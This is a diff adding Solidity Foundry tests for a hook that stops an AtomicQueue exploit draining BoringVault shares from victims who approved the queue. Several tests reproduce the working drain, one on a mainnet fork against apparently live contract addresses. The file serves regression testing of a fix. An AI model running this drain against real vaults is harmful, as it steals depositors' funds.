@@ -1,0 +1,468 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity 0.8.21;
+
+import { Test, stdError } from "@forge-std/Test.sol";
+import { ERC20 } from "@solmate/tokens/ERC20.sol";
+import { MockERC20 } from "@solmate/test/utils/mocks/MockERC20.sol";
+import { BoringVault } from "src/base/BoringVault.sol";
+import { AtomicQueue } from "src/atomic-queue/AtomicQueue.sol";
+import { IAtomicSolver } from "src/atomic-queue/IAtomicSolver.sol";
+import { AtomicQueueDerailBeforeTransferHook } from "src/helper/AtomicQueueDerailBeforeTransferHook.sol";
+
+contract PassiveSmartAccount {
+    fallback() external payable { }
+    receive() external payable { }
+}
+
+contract RevertingQueue {
+    error Nope();
+
+    fallback() external {
+        revert Nope();
+    }
+}
+
+contract ApprovingSolver is IAtomicSolver {
+    function finishSolve(bytes calldata, address, ERC20, ERC20 want, uint256, uint256 assetsForWant) external override {
+        want.approve(msg.sender, assetsForWant);
+    }
+}
+
+/// @dev Test-only IAtomicSolver that observes AtomicQueue's `nonReentrant` lock while it's genuinely held.
+///
+/// `solve()` is `nonReentrant` and calls back into `finishSolve` partway through its own execution --
+/// that's the only point a test can run code while the lock is actually set.
+///
+/// From there it staticcalls the real hook's `beforeTransfer`, so its reentrancy-detection branch fires
+/// for real. Calling from here (a staticcall from inside `finishSolve`), not a top-level call into
+/// AtomicQueue, avoids the result's being masked by SafeTransferLib's generic "TRANSFER_FROM_FAILED".
+contract ReentrancyProbeSolver is IAtomicSolver {
+    AtomicQueueDerailBeforeTransferHook internal immutable hook;
+
+    bool public probed;
+    bytes public probeRevertData;
+
+    constructor(AtomicQueueDerailBeforeTransferHook _hook) {
+        hook = _hook;
+    }
+
+    function finishSolve(bytes calldata, address, ERC20, ERC20 want, uint256, uint256 assetsForWant) external override {
+        (, bytes memory returnData) =
+            address(hook).staticcall(abi.encodeWithSelector(hook.beforeTransfer.selector, address(0xBEEF)));
+        probed = true;
+        probeRevertData = returnData;
+
+        want.approve(msg.sender, assetsForWant);
+    }
+}
+
+/// @dev A solver that checks the hook's observed gas cost during a live reentrancy, so we can react to
+/// EVM changes that affect it.
+contract GasCanarySolver is IAtomicSolver {
+    AtomicQueue internal immutable queue;
+
+    uint256 public queueStaticcallGasConsumed;
+
+    constructor(AtomicQueue _queue) {
+        queue = _queue;
+    }
+
+    function finishSolve(bytes calldata, address, ERC20, ERC20 want, uint256, uint256 assetsForWant) external override {
+        bytes memory probePayload = abi.encodeCall(
+            AtomicQueue.solve, (ERC20(address(0)), ERC20(address(0)), new address[](0), new bytes(0), address(0))
+        );
+        uint256 before = gasleft();
+        (bool success,) = address(queue).staticcall{ gas: 8000 }(probePayload);
+        queueStaticcallGasConsumed = before - gasleft();
+        require(!success, "canary: unexpected success");
+
+        want.approve(msg.sender, assetsForWant);
+    }
+}
+
+contract AtomicQueueDerailBeforeTransferHookTest is Test {
+    BoringVault internal boringVault;
+    AtomicQueue internal atomicQueue;
+    AtomicQueueDerailBeforeTransferHook internal hook;
+
+    MockERC20 internal junkToken;
+    MockERC20 internal otherToken;
+
+    PassiveSmartAccount internal victim;
+    ApprovingSolver internal approvingSolver;
+
+    address internal attacker = vm.addr(0xA11CE);
+    address internal alice = vm.addr(1);
+    address internal bob = vm.addr(2);
+
+    string internal constant TRANSFER_FROM_FAILED = "TRANSFER_FROM_FAILED";
+
+    uint256 internal constant VICTIM_SHARES = 100e18;
+    uint256 internal constant ATTACKER_OFFER = 1e18;
+
+    function setUp() external {
+        boringVault = new BoringVault(address(this), "Boring Vault", "BV", 18);
+        atomicQueue = new AtomicQueue();
+
+        junkToken = new MockERC20("Junk", "JUNK", 18);
+        otherToken = new MockERC20("Other", "OTHER", 18);
+
+        victim = new PassiveSmartAccount();
+        approvingSolver = new ApprovingSolver();
+
+        hook = new AtomicQueueDerailBeforeTransferHook(address(atomicQueue));
+
+        _mintShares(address(victim), VICTIM_SHARES);
+        vm.prank(address(victim));
+        boringVault.approve(address(atomicQueue), type(uint256).max);
+
+        boringVault.setBeforeTransferHook(address(hook));
+    }
+
+    function testAttackDrainsApprovedSharesWithoutHook() external {
+        boringVault.setBeforeTransferHook(address(0));
+        _createAttackRequest();
+
+        _executeAttackSolve();
+
+        assertEq(boringVault.balanceOf(attacker), VICTIM_SHARES);
+        assertEq(boringVault.balanceOf(address(victim)), 0);
+        assertEq(junkToken.balanceOf(address(victim)), ATTACKER_OFFER);
+    }
+
+    function testHookBlocksAttack() external {
+        _createAttackRequest();
+
+        vm.expectRevert(bytes(TRANSFER_FROM_FAILED));
+        _executeAttackSolve();
+
+        assertEq(boringVault.balanceOf(attacker), 0);
+        assertEq(boringVault.balanceOf(address(victim)), VICTIM_SHARES);
+    }
+
+    function testHookBlocksSolveWithSharesAsOffer() external {
+        _mintShares(alice, 10e18);
+        junkToken.mint(address(approvingSolver), 10e18);
+
+        vm.startPrank(alice);
+        boringVault.approve(address(atomicQueue), type(uint256).max);
+        atomicQueue.updateAtomicRequest(ERC20(address(boringVault)), ERC20(address(junkToken)), _request(10e18, 1e18));
+        vm.stopPrank();
+
+        vm.prank(alice);
+        vm.expectRevert(bytes(TRANSFER_FROM_FAILED));
+        atomicQueue.solve(
+            ERC20(address(boringVault)), ERC20(address(junkToken)), _users(alice), hex"", address(approvingSolver)
+        );
+
+        assertEq(boringVault.balanceOf(alice), 10e18);
+        assertEq(junkToken.balanceOf(alice), 0);
+    }
+
+    function testSolveOfUnrelatedTokensStillWorks() external {
+        junkToken.mint(alice, 10e18);
+        otherToken.mint(address(approvingSolver), 10e18);
+
+        vm.startPrank(alice);
+        junkToken.approve(address(atomicQueue), type(uint256).max);
+        atomicQueue.updateAtomicRequest(ERC20(address(junkToken)), ERC20(address(otherToken)), _request(10e18, 1e18));
+        vm.stopPrank();
+
+        vm.prank(alice);
+        atomicQueue.solve(
+            ERC20(address(junkToken)), ERC20(address(otherToken)), _users(alice), hex"", address(approvingSolver)
+        );
+
+        assertEq(otherToken.balanceOf(alice), 10e18);
+        assertEq(junkToken.balanceOf(address(approvingSolver)), 10e18);
+    }
+
+    function testTransferStillWorks() external {
+        _mintShares(alice, 10e18);
+
+        vm.prank(alice);
+        boringVault.transfer(bob, 4e18);
+
+        assertEq(boringVault.balanceOf(alice), 6e18);
+        assertEq(boringVault.balanceOf(bob), 4e18);
+    }
+
+    function testTransferFromStillWorks() external {
+        _mintShares(alice, 10e18);
+        vm.prank(alice);
+        boringVault.approve(bob, 10e18);
+
+        vm.prank(bob);
+        boringVault.transferFrom(alice, bob, 4e18);
+
+        assertEq(boringVault.balanceOf(alice), 6e18);
+        assertEq(boringVault.balanceOf(bob), 4e18);
+        assertEq(boringVault.allowance(alice, bob), 6e18);
+    }
+
+    function testEnterAndExitStillWork() external {
+        junkToken.mint(alice, 10e18);
+        vm.prank(alice);
+        junkToken.approve(address(boringVault), 10e18);
+
+        boringVault.enter(alice, ERC20(address(junkToken)), 10e18, alice, 10e18);
+        assertEq(boringVault.balanceOf(alice), 10e18);
+
+        boringVault.exit(alice, ERC20(address(junkToken)), 10e18, alice, 10e18);
+        assertEq(boringVault.balanceOf(alice), 0);
+        assertEq(junkToken.balanceOf(alice), 10e18);
+    }
+
+    function testMisconfiguredQueueBlocksTransfers() external {
+        boringVault.setBeforeTransferHook(address(new AtomicQueueDerailBeforeTransferHook(address(0xDEAD))));
+        _mintShares(alice, 10e18);
+
+        vm.prank(alice);
+        vm.expectRevert(stdError.assertionError);
+        boringVault.transfer(bob, 1e18);
+    }
+
+    function testUnrelatedRevertBlocksTransfers() external {
+        RevertingQueue revertingQueue = new RevertingQueue();
+        boringVault.setBeforeTransferHook(address(new AtomicQueueDerailBeforeTransferHook(address(revertingQueue))));
+        _mintShares(alice, 10e18);
+
+        vm.prank(alice);
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                AtomicQueueDerailBeforeTransferHook.UnexpectedRevert.selector,
+                alice,
+                abi.encodeWithSelector(RevertingQueue.Nope.selector)
+            )
+        );
+        boringVault.transfer(bob, 1e18);
+    }
+
+    function testUseOfInvalidContractBlocksLiveReentrancy() external {
+        ReentrancyProbeSolver probe = new ReentrancyProbeSolver(hook);
+
+        junkToken.mint(alice, 10e18);
+        otherToken.mint(address(probe), 10e18);
+
+        vm.startPrank(alice);
+        junkToken.approve(address(atomicQueue), type(uint256).max);
+        atomicQueue.updateAtomicRequest(ERC20(address(junkToken)), ERC20(address(otherToken)), _request(10e18, 1e18));
+        vm.stopPrank();
+
+        vm.prank(alice);
+        atomicQueue.solve(ERC20(address(junkToken)), ERC20(address(otherToken)), _users(alice), hex"", address(probe));
+
+        assertTrue(probe.probed());
+        assertEq(
+            probe.probeRevertData(),
+            abi.encodeWithSelector(
+                AtomicQueueDerailBeforeTransferHook.UseOfInvalidContract.selector,
+                address(0xBEEF),
+                address(atomicQueue),
+                abi.encodeWithSignature("Error(string)", "REENTRANCY")
+            )
+        );
+    }
+
+    /// @dev EIP-150 gas-griefing check: a caller who supplies too little gas to the outer call
+    /// can only ever forward gasleft() - gasleft()/64 to the staticcall, which could silently be
+    /// less than DERAIL_GAS_STIPEND. Without a guard, that under-forwarded probe could run out of
+    /// gas before completing a live-reentrancy revert, producing empty return data indistinguishable
+    /// from "not reentrant" -- and letting the transfer bypass the protection. Confirm the hook now
+    /// reverts up front instead.
+    function testInsufficientGasFailsClosed() external {
+        _mintShares(alice, 10e18);
+
+        vm.prank(alice);
+        vm.expectPartialRevert(AtomicQueueDerailBeforeTransferHook.InsufficientGasForProbe.selector);
+        boringVault.transfer{ gas: 11_000 }(bob, 1e18);
+    }
+
+    function testHookedTransferGasStaysReasonable() external {
+        _mintShares(alice, 10e18);
+
+        vm.prank(alice);
+        uint256 start = gasleft();
+        boringVault.transfer(bob, 1e18);
+        uint256 used = start - gasleft();
+
+        assertLt(used, 200_000);
+    }
+
+    function _mintShares(address to, uint256 amount) internal {
+        boringVault.enter(address(0), ERC20(address(0)), 0, to, amount);
+    }
+
+    function _users(address user) internal pure returns (address[] memory users) {
+        users = new address[](1);
+        users[0] = user;
+    }
+
+    function _request(
+        uint256 offerAmount,
+        uint256 atomicPrice
+    )
+        internal
+        view
+        returns (AtomicQueue.AtomicRequest memory)
+    {
+        return AtomicQueue.AtomicRequest({
+            deadline: uint64(block.timestamp + 1 days),
+            atomicPrice: uint88(atomicPrice),
+            offerAmount: uint96(offerAmount),
+            inSolve: false
+        });
+    }
+
+    function _createAttackRequest() internal {
+        junkToken.mint(attacker, ATTACKER_OFFER);
+
+        vm.startPrank(attacker);
+        junkToken.approve(address(atomicQueue), type(uint256).max);
+        atomicQueue.updateAtomicRequest(
+            ERC20(address(junkToken)), ERC20(address(boringVault)), _request(ATTACKER_OFFER, VICTIM_SHARES)
+        );
+        vm.stopPrank();
+    }
+
+    function _executeAttackSolve() internal {
+        vm.prank(attacker);
+        atomicQueue.solve(
+            ERC20(address(junkToken)), ERC20(address(boringVault)), _users(attacker), hex"", address(victim)
+        );
+    }
+}
+
+contract AtomicQueueDerailBeforeTransferHookForkTest is Test {
+    BoringVault internal constant BORING_VAULT = BoringVault(payable(0x196ead472583Bc1e9aF7A05F860D9857e1Bd3dCc));
+    AtomicQueue internal constant ATOMIC_QUEUE = AtomicQueue(0xc7287780bfa0C5D2dD74e3e51E238B1cd9B221ee);
+    uint256 internal constant FORK_BLOCK = 25_943_286; // A state of the vault before we introduced the temporary freeze
+    // hook
+
+    MockERC20 internal junkToken;
+    PassiveSmartAccount internal victim;
+
+    address internal attacker = vm.addr(0xA11CE);
+
+    uint256 internal constant VICTIM_SHARES = 100e18;
+    uint256 internal constant ATTACKER_OFFER = 1e18;
+
+    function setUp() external {
+        vm.selectFork(vm.createFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK));
+
+        junkToken = new MockERC20("Junk", "JUNK", 18);
+        victim = new PassiveSmartAccount();
+
+        deal(address(BORING_VAULT), address(victim), VICTIM_SHARES);
+        vm.prank(address(victim));
+        BORING_VAULT.approve(address(ATOMIC_QUEUE), type(uint256).max);
+
+        junkToken.mint(attacker, ATTACKER_OFFER);
+        vm.startPrank(attacker);
+        junkToken.approve(address(ATOMIC_QUEUE), type(uint256).max);
+        ATOMIC_QUEUE.updateAtomicRequest(
+            ERC20(address(junkToken)),
+            ERC20(address(BORING_VAULT)),
+            AtomicQueue.AtomicRequest({
+                deadline: uint64(block.timestamp + 1 days),
+                atomicPrice: uint88(VICTIM_SHARES),
+                offerAmount: uint96(ATTACKER_OFFER),
+                inSolve: false
+            })
+        );
+        vm.stopPrank();
+    }
+
+    function testForkAttackDrainsApprovedShares() external {
+        assertEq(address(BORING_VAULT.hook()), address(0));
+
+        _executeAttackSolve();
+
+        assertEq(BORING_VAULT.balanceOf(attacker), VICTIM_SHARES);
+        assertEq(BORING_VAULT.balanceOf(address(victim)), 0);
+        assertEq(junkToken.balanceOf(address(victim)), ATTACKER_OFFER);
+    }
+
+    function testForkDerailHookPreventsAttack() external {
+        _installDerailHook();
+
+        vm.expectRevert(bytes("TRANSFER_FROM_FAILED"));
+        _executeAttackSolve();
+
+        assertEq(BORING_VAULT.balanceOf(attacker), 0);
+        assertEq(BORING_VAULT.balanceOf(address(victim)), VICTIM_SHARES);
+    }
+
+    function testForkTransfersStillWorkWithDerailHook() external {
+        _installDerailHook();
+
+        vm.prank(address(victim));
+        BORING_VAULT.transfer(attacker, 4e18);
+
+        assertEq(BORING_VAULT.balanceOf(attacker), 4e18);
+        assertEq(BORING_VAULT.balanceOf(address(victim)), VICTIM_SHARES - 4e18);
+    }
+
+    /// @notice Canary for DERAIL_GAS_STIPEND's safety margin, run against the actual deployed AtomicQueue
+    /// bytecode instead of a local recompile.
+    ///
+    /// This test exists to catch gas cost changes from a future EVM upgrade. If an upgrade repriced the
+    /// opcodes the hook's inner staticcall executes, DERAIL_GAS_STIPEND could silently stop being enough
+    /// to complete the reentrancy revert. That failure would be invisible on-chain: the staticcall
+    /// exceptionally halts the same way whether the queue was genuinely not reentrant, which is safe, or
+    /// genuinely reentrant but ran out of gas mid-revert, which is the exact bypass this hook exists to
+    /// prevent. Both produce success = false, empty return data, and full consumption of the forwarded
+    /// gas. There's no telling them apart after the fact, so the margin has to be watched here, not
+    /// detected at runtime.
+    ///
+    /// This test measures that margin directly and fails if it ever gets dangerously thin.
+    function testForkReentrancyProbeGasStaysWellUnderStipend() external {
+        GasCanarySolver canary = new GasCanarySolver(ATOMIC_QUEUE);
+
+        MockERC20 otherToken = new MockERC20("Other", "OTHER", 18);
+        otherToken.mint(address(canary), 10e18);
+
+        junkToken.mint(attacker, 10e18);
+
+        address[] memory users = new address[](1);
+        users[0] = attacker;
+
+        vm.prank(attacker);
+        ATOMIC_QUEUE.updateAtomicRequest(
+            ERC20(address(junkToken)),
+            ERC20(address(otherToken)),
+            AtomicQueue.AtomicRequest({
+                deadline: uint64(block.timestamp + 1 days),
+                atomicPrice: uint88(1e18),
+                offerAmount: uint96(10e18),
+                inSolve: false
+            })
+        );
+
+        vm.prank(attacker);
+        ATOMIC_QUEUE.solve(ERC20(address(junkToken)), ERC20(address(otherToken)), users, hex"", address(canary));
+
+        assertLt(
+            canary.queueStaticcallGasConsumed(),
+            3000,
+            "reentrancy-probe staticcall gas cost against the live deployed AtomicQueue drifted toward the DERAIL_GAS_STIPEND margin"
+        );
+    }
+
+    function _installDerailHook() internal {
+        AtomicQueueDerailBeforeTransferHook hook = new AtomicQueueDerailBeforeTransferHook(address(ATOMIC_QUEUE));
+
+        vm.prank(BORING_VAULT.owner());
+        BORING_VAULT.setBeforeTransferHook(address(hook));
+
+        assertEq(address(BORING_VAULT.hook()), address(hook));
+    }
+
+    function _executeAttackSolve() internal {
+        address[] memory users = new address[](1);
+        users[0] = attacker;
+
+        vm.prank(attacker);
+        ATOMIC_QUEUE.solve(ERC20(address(junkToken)), ERC20(address(BORING_VAULT)), users, hex"", address(victim));
+    }
+}
